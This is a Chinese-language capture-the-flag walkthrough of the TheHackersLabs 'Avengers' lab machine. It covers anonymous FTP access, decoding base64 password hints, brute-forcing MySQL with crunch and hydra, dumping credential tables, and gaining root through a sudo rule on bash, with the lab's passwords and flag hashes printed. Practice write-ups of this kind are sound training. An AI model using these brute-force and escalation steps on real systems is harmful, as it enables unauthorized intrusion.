# Avengers

2025.03.02 https://thehackerslabs.com/avengers/

[video]()

## Ip

192.168.5.40

## Scan

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

ftp 可匿名登陆，下载文件：

```
-rw-r--r--    1 0        0             459 Mar 24  2024 FLAG.txt
-rw-r--r--    1 0        0             417 Mar 24  2024 credential_mysql.txt.zip
```

FLAG.txt 中没什么有用信息。credential_mysql.txt.zip 有密码，使用 john 进行破解，没找到密码。

扫描 web 读取 robots.txt 文件：

```
User-agent: *
Disallow: /webs/
Disallow: /mysql/
```

访问 http://192.168.5.40/mysql/database.html 在源码中有提示：

```
<!-- You have found a password of a user that is hidden out there, keep looking... -->
<!-- password: V201V2JHTnVjR2haYmtveFpFZEZQUT09 -->
```

同时在这里发现了用户名 http://192.168.5.40/php/login.php:

```
$servername = "192.168.28.7";
$username = "h4lc3";
$password = "***********";
$dbname = "db_true";
```

发现用户名 h4lc3 使用上面发现的密码进行登陆 ssh 和 mysql 都不对，再看上面的数据库连接密码是 8 个星号，这里长度不对，使用 cyberchef 进行 base64 解码 3 次，得到了 11 位的字符串 fuerzabruta 再次爆破 ssh 和 mysql 也登陆不了。

访问这个 http://192.168.5.40/webs/secret.html 验证页面，输入刚才得到的密码 fuerzabruta ，得到了一个用户名 hulk 使用这个用户名登陆 ssh，登陆成功。

寻找 user flag：

```
hulk@TheHackersLabs-Avengers:~$ cat wait/decrypt.txt
I'm going to provide you with a decryption password for some file, guess which file could be the one that decrypts this...

Password: decryptavengers

hulk@TheHackersLabs-Avengers:~$ cat mysql/hint/zip/shit_how_they_did_know_this_password.txt

Congratulations, you found the password to decrypt the compressed FTP .zip file

Now you know what to do with this... I guess

password: (You thought I would give you the password so quickly, because if you look closely at the file you would see the password more clearly...)
```

提到之前发现的 credential_mysql.txt.zip 它的解压密码就是这个文件的文件名 shit_how_they_did_know_this_password 解压后的内容显示：

```
Listen, stif, I sent you the password of my MySQL user by email, but I think you didn't get it, I'll send it to you here:

User: hulk
Password: fuerzabrutaXXXX

Remember to change the "XXXX" to a secure number combination before sending.

HINT: it is in a range of 0-3000
```

需要对 mysql 的登陆密码进行爆破：

```
crunch 15 15 -t fuerzabruta%%%% > pass
hydra -t 32 -l hulk -P pass mysql://192.168.5.40
[3306][mysql] host: 192.168.5.40   login: hulk   password: fuerzabruta2024
```

登陆 mysql，进行枚举：

```
MySQL [db_flag]> use db_true;
MySQL [db_true]> show tables;
+-------------------+
| Tables_in_db_true |
+-------------------+
| nothing           |
+-------------------+

MySQL [db_true]> select * from nothing;
+----+--------------+-----------------------------------------------+
| id | nothing_user | nothing_password                              |
+----+--------------+-----------------------------------------------+
|  1 | nada         | JAHDdjwoaiJDWIAJDsDJWAjdwaiojKDAKAkdoaKDPOAA= |
+----+--------------+-----------------------------------------------+

MySQL [db_true]> use no_db;
MySQL [no_db]> show tables;
+-----------------+
| Tables_in_no_db |
+-----------------+
| passwords       |
| users           |
+-----------------+

MySQL [no_db]> select * from users;
+----+--------+---------------+
| id | user   | password      |
+----+--------+---------------+
|  1 | stif   | escudoamerica |
|  2 | hulk   | fuerza*****   |
|  3 | antman | ******        |
|  4 | thanos | NOPASSWD      |
+----+--------+---------------+

MySQL [no_db]> select * from passwords;
+----+--------------------------------------------------------------+----------------------------------------------------+
| id | password                                                     | description                                        |
+----+--------------------------------------------------------------+----------------------------------------------------+
|  1 | wr9UZSBjcmVlcyBxdWUgc2VyaWEgdGFuIGZhY2lsPyBKQUpBSkFKQUpKQUpB | Desencripta esa contraseña para poder ser root ;)  |
+----+--------------------------------------------------------------+----------------------------------------------------+
```

系统用户 stif 的登陆密码是 escudoamerica ，切换到该用户后，发下了 user flag，但是没权限读取，需要 root 权限。

sudo -l 显示：

```
(ALL : ALL) NOPASSWD: /usr/bin/bash
(ALL : ALL) NOPASSWD: /usr/bin/unzip
```

直接提权拿到 2 个 flag：

```
stif@TheHackersLabs-Avengers:~$ sudo /usr/bin/bash
root@TheHackersLabs-Avengers:/home/stif# ls
flag  game.py  pista  user.txt
root@TheHackersLabs-Avengers:/home/stif# cat user.txt
31c29fb1d045f2d17f44fa2921ef4c32  -
root@TheHackersLabs-Avengers:~# cat root.txt
658e8256a7b4cf93766dc6ef546a2825  -
```
